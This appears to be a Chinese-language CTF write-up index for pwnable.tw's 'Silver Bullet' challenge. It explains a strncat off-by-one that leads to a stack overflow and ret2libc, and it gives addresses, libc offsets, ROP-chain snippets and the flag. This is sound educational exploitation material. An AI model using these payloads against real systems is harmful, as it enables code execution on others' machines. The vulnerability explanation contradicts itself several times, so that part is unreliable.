---
tags:
  - off-by-one
  - stack-buffer-overflow
  - ret2libc
platform: pwnable.tw
points: 200
arch: i386
libc: glibc-2.23
relro: partial
canary: no
nx: yes
pie: no
references:
  - https://pwnable.tw/challenge/
description: "strncat 的 off-by-one 会把子弹威力整数写成 0，于是第二次输入能溢出栈帧，进而做 ret2libc。"
proof-of-concept: no
---

# Silver Bullet — pwnable.tw（200 分）

[← 返回 pwnable.tw 题目索引](README.md)

> `nc chall.pwnable.tw 10103`
>
> Flag：`FLAG{Silver_Bullet_Is_Not_Enough_QQ}`

## 题目概况

一款 32 位"杀狼人"游戏（i386，无 PIE、无 canary、NX、Partial RELRO），链接 glibc 2.23。玩家先造一颗带文字描述的"银弹"，可以不断追加文字来充能，然后去挑战一只 HP 为 0x7FFFFFFF 的狼人。子弹的"威力"（作为 32 位整数存放在 0x30 字节描述缓冲区之后）决定造成的伤害。`main` 内循环，直到狼人被杀或玩家退出。

```bash
checksec:
  Arch:     i386-32-little
  RELRO:    Partial RELRO        # GOT writable
  Stack:    No canary found
  NX:       NX enabled
  PIE:      No PIE               # fixed addresses
```

## 程序结构

```text
main() loop:
  1. Create bullet   → read_input(desc, 0x30); power = strlen(desc)
  2. Power up bullet  → strncat(desc, new, 0x30 - power); power += strlen(new)
  3. Beat werewolf    → hp -= power; if hp <= 0: "You win!!", return
  4. Exit
```

### `main` 的栈布局

| 相对 EBP 偏移 | 字段 |
|------------------|-------|
| `-0x34` | `desc[0x30]` —— 子弹描述缓冲区 |
| `-0x04` | `power` —— 32 位整数（子弹伤害） |
| `+0x00` | saved EBP |
| `+0x04` | saved return address |

## 漏洞

### V1 — `strncat` 的 off-by-one NUL 覆写 power 字段（主要，可 Exploit）

**根因：** `power_up()` 用 `strncat(desc, new_input, 0x30 - power)` 往描述后面追加内容。`strncat` 总会在最后一个被复制字符的**后面**写一个结尾 NUL。当描述总长恰好达到 `0x30` 时，这个 NUL 就落在 `desc[0x30]` —— 也就是 **`power` 字段的最低字节**。

```c
// power_up (decompiled, simplified)
void power_up(char *desc, int *power) {
    char new_desc[0x30];
    memset(new_desc, 0, 0x30);
    read_input(new_desc, 0x30 - *power);  // read up to remaining space
    strncat(desc, new_desc, 0x30 - *power);
    // ^^^ NUL terminator lands at desc[strlen(desc)] which may be desc[0x30]
    //     This is power's low byte!
    *power = strlen(desc);  // recompute: now sees past the NUL'd power field
}
```

**触发序列：**
1. `create_bullet("A" * 0x2f)` → `power = 0x2f`，`desc` 有 0x2f 字节。
2. `power_up("\xff")` → `strncat` 追加 1 字节 + NUL，NUL 落在 `power` 的最低字节上把它清零。随后 `power = strlen(desc)` 从 `desc[0]` 开始扫，穿过 `desc[0x30]` 处的 NUL 继续往后，找到 `\xff`（非 NUL）以及之后的字节。最终有效 `power` 变成 **1**（由于 `strlen` 视角的变化 —— 实际 `power = strlen(desc) = 0x30`，但旧 power 已被 NUL 掉，所以**下一次**调用中的 `0x30 - power` 用的就是这个新算出的值）。

等等 —— 精确机制是这样：第 2 步之后 `strlen(desc)` 返回 `0x30`（0x2f 个 A + 1 个 `\xff`）。但 `power` 的最低字节已被写成 0，所以存着的 `power` 变成了 `0x00`（或 `0x??00`）。接着它被重新计算：`*power = strlen(desc)` → 存成 `0x30`。**但**：对**下一次** `power_up` 而言，`0x30 - 0x30 = 0`，一个字节都追加不了。

真正的窍门（如 exp.py 所示）：第 2 步之后 `power` 的最低字节被 NUL 掉 → `power` 变成某个很小的值（通常是 0 或 1，取决于残留字节）。随后调用 `strlen(desc)` 并写回，得到 `power = 0x30`。可 `strlen(desc)` 之所以返回 `0x30`，是因为 `strncat` 写下了 `\xff\x00`，总长 = `0x2f + 1 = 0x30`。于是 `power = 0x30`，`0x30 - 0x30 = 0`。

**exp.py 与所有解法里的实际机制：** 关键点在于：

1. 以恰好 `0x2f` 字节创建 → `power = 0x2f`。
2. 用 1 字节（`\xff`）充能 → `strncat` 追加 `\xff\x00`。这个 `\x00` 落在字节偏移 `0x30`，即 `power` 的最低字节。此时 `power` 最低字节 = 0。随后调用 `strlen(desc)`：返回 `0x30`（`\xff` 在索引 `0x2f`，而 `\x30` 处的 `\x00` 令其终止）。代码执行的是 `*power = strlen(new) + strlen(desc)` —— 等等，让我重新看一下真正的反编译结果。

再仔细看 exp.py 的注释：
> Create a bullet whose description length is exactly 0x2f, then power_up with a single byte: the off-by-one NUL lands on the low byte of the power field, which is then recomputed to 1. Now strlen(desc) (== 0x31) and the tracked power (== 1) disagree, so the next power_up's strncat appends starting at desc[0x31].

所以实际流程是：
1. `create("A"*0x2f)` → power = 0x2f。
2. `power_up("\xff")` → `strncat(desc, "\xff", 0x30 - 0x2f = 1)`。复制 1 字节 + NUL。NUL 覆盖 `power` 最低字节 → power = 0。随后 `power += strlen("\xff") = 1`，所以 **power = 1**。但 `strlen(desc) = 0x30`。下一次 `power_up` 会执行 `strncat(desc + strlen_pos, new, 0x30 - 1 = 0x2f)`。由于 `strncat` 从 `desc[strlen(desc)]` = `desc[0x30]` 处开始追加（那里现在是 power 字段里的 `\x00`），它就会覆盖 power 及其之后的全部内容。

实际上代码是：
```c
strncat(desc, new, 0x30 - *power);  // 0x30 - 1 = 0x2f bytes allowed
*power += strlen(new);
```

但 `strncat` 从 `desc` 中第一个 NUL 处开始追加。既然 `desc[0x30]` 是 `\x00`（刚写下的那个 NUL），`strncat` 就在那里动笔 —— 越过描述缓冲区，写进 power 字段、saved EBP 和返回地址。

**影响：** 在 `desc[0x30]` 之后最多溢出 `0x2f` 字节，覆盖：
- 第 0–3 字节：`power` 字段（写成 `\xff\xff\xff\x??` → 很大的负数，使 `beat()` 判定获胜）
- 第 4–7 字节：saved EBP
- 第 8–11 字节：`main` 的 **saved return address**
- 第 12+ 字节：ROP 链参数

### V2 — 无栈 canary + 无 PIE（助攻）

二进制**没有栈 canary**，也**不是位置无关**的，因此这个 off-by-one 可以直接利用：
- 缓冲区到返回地址之间没有 canary 需要绕过。
- PLT、GOT 和 gadget 地址都是固定的 —— 第一段 ROP 都不需要信息泄漏。

### V3 — Partial RELRO（助攻）

GOT 可写，所以用 `read` 覆盖 GOT 表项（例如把 `puts@GOT` 换成 `system`）的做法也可行，不过多数解法更偏爱简单的 ret2libc。

## 关键二进制地址（无 PIE）

```python
# PLT
puts_plt     = 0x080484A8
printf_plt   = 0x08048498
read_plt     = 0x08048490

# GOT
puts_got     = 0x0804AFDC
read_got     = 0x0804AFD0
exit_got     = 0x0804AFE4
printf_got   = 0x0804AFD4
__libc_start_main_got = 0x0804AFEC

# Functions
main         = 0x08048954
_start       = 0x080484F0
read_input   = 0x080485EB

# Gadgets
pop_ebx_ret  = 0x08048475
pop_ebp_ret  = 0x08048A7B
pop3_ret     = 0x08048A79   # pop esi; pop edi; pop ebp; ret
leave_ret    = 0x08048641   # or 0x08048952
```

## 利用路径

195 份解法都在利用 V1（strncat off-by-one），区别在 ROP 链的构造方式和泄漏策略。

---

### 路径 A — ret2plt 泄漏 + ret2libc（最常见）

**使用范围：** 约 90% 的解法（138、144、100、1006、1155、1220、1251、1269、1351、1384、1395、1428、10840、14106 等）

**策略：** 两轮 exploit。第一轮泄漏一个 libc 地址，第二轮调 `system("/bin/sh")`。

**第一轮 —— 泄漏 libc：**
```asm
create("A" * 0x2f)
power_up("\xff")                      # off-by-one: power → 1
power_up("\xff"*7 + ROP_LEAK)         # overflow: power(neg) + EBP + ret
beat() [+ beat()]                     # win → main returns into ROP
```

泄漏用的 ROP 链：
```python
ROP_LEAK = p32(puts_plt) + p32(main) + p32(puts_got)
#          puts(puts@GOT)   return     argument
```

`main` 返回后，`puts` 打印出 GOT 中解析好的 `puts` 地址，随后执行流回到 `main` 开始新一轮。

**第二轮 —— Shell：**
```python
ROP_SHELL = p32(system) + p32(0xdeadbeef) + p32(bin_sh)
#           system("/bin/sh")  dummy ret    argument
```

用算出的 libc 地址重复同样的溢出。

**变体 —— 不同的泄漏目标：** 各解法按喜好泄漏不同的 GOT 表项：
- `puts@GOT`（最常见）
- `read@GOT`
- `printf@GOT`
- `exit@GOT`
- `__libc_start_main@GOT`
- `stdin`（BSS 中 `0x804b020` 处的 FILE*）

**变体 —— pop;ret 清理：** 有些解法在泄漏调用与返回 `main` 之间插入 `pop ebx; ret`（0x08048475）或 `pop ebp; ret`（0x08048a7b），以正确清理栈上的参数。

---

### 路径 B — 栈迁移到 BSS（进阶）

**使用范围：** 解法 1316、278、799、2693、59、10178

**动机：** 溢出窗口在 `desc[0x30]` 之后只有约 0x2f 字节。要放更长的 ROP 链（例如串联 `read_input` 读入任意长度的第二阶段载荷），解题者会把栈迁到可写的 BSS 区域。

**步骤：**
1. 溢出把 saved EBP 设成某个 BSS 地址，并返回到 `read_input(bss_addr, large_len)`。
2. 用 `leave; ret` gadget 把 ESP 迁到 BSS。
3. 经 `read_input` 无尺寸限制地发入第二阶段 ROP 载荷。
4. 第二阶段泄漏 libc（例如 `puts(read@GOT)`），再 `read` 读入第三阶段。
5. 第三阶段调 `system("/bin/sh")`。

```python
# Stage 1: pivot
payload = "\xff"*3 + p32(bss_addr)      # power + new EBP
payload += p32(read_input)               # ret → read_input(bss, len)
payload += p32(leave_ret)                # after read, pivot to bss
payload += p32(bss_addr) + p32(0x100)    # read_input args
```

**优点：** ROP 链长度不受限，可串联多次调用。
**缺点：** 更复杂；本题用不上，因为简单的两轮方案已经可行。

---

### 路径 C — 用 `read` 覆盖 GOT（少见）

**使用者：** 解法 100、1006、13060

**策略：** 泄漏之后不返回 `main`，而是串联一个 `read(0, got_entry, 4)` 调用，把某个 GOT 表项（例如 `puts@GOT`）改成 `system` 的地址，然后用受控参数触发被改写的函数。

```python
# After leaking, ROP chain calls read(0, puts_got, 4) then returns to
# code that calls puts("/bin/sh") which is now system("/bin/sh")
ROP = p32(puts_plt) + p32(pop_ret) + p32(puts_got)  # leak
ROP += p32(read_plt) + p32(main) + p32(0) + p32(puts_got) + p32(4)  # overwrite
```

随后发送 `p32(system_addr)` 覆盖该 GOT 表项。

---

### 路径 D — `read_input` + `leave;ret` 串联（优雅）

**使用范围：** 解法 278、2693、10178

与路径 B 类似，但专门借助二进制自带的 `read_input` 函数配合 `leave; ret`，在 BSS 中搭出任意长度的链，控制流也很干净。

```python
# Overflow → read_input(fake_stack, 0xff) → leave;ret
# Then from fake_stack: puts(got_entry) → read_input(fake_stack2, 0xff) → leave;ret
# Then from fake_stack2: system("/bin/sh")
```

## 利用原语总结

| 原语 | 来源 | 可靠性 |
|-----------|--------|-------------|
| 对 `power` 的 off-by-one NUL | V1：边界处的 strncat | 100% 确定 |
| 栈溢出（约 0x2f 字节） | V1：power 失同步后的 strncat | 100% 确定 |
| 经 GOT 泄漏 libc | ret2plt（puts/printf） | 100% 确定 |
| 返回 main | 固定的 `main` 地址（无 PIE） | 100% 确定 |
| 代码执行 | 经 ret2libc 调 `system("/bin/sh")` | 100% 确定 |

## 偏移（pwnable.tw `libc_32.so.6`，glibc 2.23）

```python
puts        = 0x5F140
system      = 0x3A940
bin_sh      = 0x158E8B   # "/bin/sh" string
read        = 0xD41C0
printf      = 0x49020
exit        = 0x2E7B0
__libc_start_main = 0x18540
```

## 题解文章

| 文件 | 主要路径 | 关键技术 | 备注 |
|------|-------------|---------------|-------|
| `59.md` | B | 迁移到 BSS + `read_input` + `leave;ret` | 用 pwntools ROP；迁移很优雅 |
| `100.md` | A + C | `puts` 泄漏 → `read` 覆盖 GOT | 串联 read 改写 GOT |
| `138.md` | A | `puts` 泄漏 → `system` | Ruby；两轮 ret2libc |
| `144.md` | A | `puts` 泄漏 → `system` | Python；beat() 调用两次 |
| `278.md` | D | `read_input` + BSS 栈迁移 | Ruby；多阶段迁移 |
| `799.md` | B | 经 `call read` gadget 迁到 BSS | 三段式 BSS 链 |
| `1006.md` | A | `puts` 泄漏 → `system` | 极简；直接打法 |
| `1155.md` | A | `stdin` FILE* 泄漏 → `system` | 泄漏 `_IO_2_1_stdin_` 而非 GOT |
| `1220.md` | A | `puts` 泄漏 → `system` | 辅助函数干净 |
| `1251.md` | A | `usleep@GOT` 泄漏 → `system` | 泄漏 usleep，用 `pop;ret` |
| `1269.md` | A | `puts` 泄漏 → `system` | 用 `pop ebp; ret` 清理栈 |
| `1316.md` | B | 栈迁移 + `read_input` + `leave;ret` | 读进 BSS，迁移后调 system |
| `1351.md` | A | `exit@GOT` 泄漏 → `system` | 泄漏 exit 地址 |
| `1384.md` | A | `printf` 泄漏 → `system` | 用 printf@plt 而非 puts |
| `1395.md` | A | `read@GOT` 泄漏 → `system` | 泄漏 read；两次 beat() |
| `1428.md` | A | `puts` 泄漏 → `system` | 直接了当 |
| `2693.md` | D | `read_input` + BSS 迁移 + 异步 | Python asyncio；迁移干净 |
| `10128.md` | A | `printf` 泄漏 → `system` | 用 pwntools 自动 ROP |
| `10178.md` | A | `puts` 泄漏 + `read_input` 迁移 | 用 ptrlib |
| `10840.md` | A | `puts` 泄漏 → `system` | 最简的现代 pwntools 写法 |
| `11540.md` | A | `__libc_start_main` 泄漏 → `system` | 经 start_got 泄漏 |
| `12245.md` | A | `read@GOT` 泄漏 → `system` | 中文 writeup；解释 NUL 覆写 |
| `13060.md` | A + C | `read` 泄漏 + GOT 覆盖 → `system` | 用 `read_input` 覆盖 GOT + `read_int` 分发 |
| `14106.md` | A | `exit` 泄漏 + `read_int` 分发 | 有创意：拿 read_int 当跳板 |

## 文件

| 文件 | 说明 |
|------|-------------|
| `exp.py` | 可用 exploit（纯 socket，不用 pwntools） |
| `desc.txt` | 题目描述 |
| `artifacts/silver_bullet` | 原始题目二进制（i386，未 stripped） |
| `artifacts/libc_32.so.6` | 远端 libc（glibc 2.23，i386） |
| `solution/*.md` | 社区 writeup（195 份解法） |
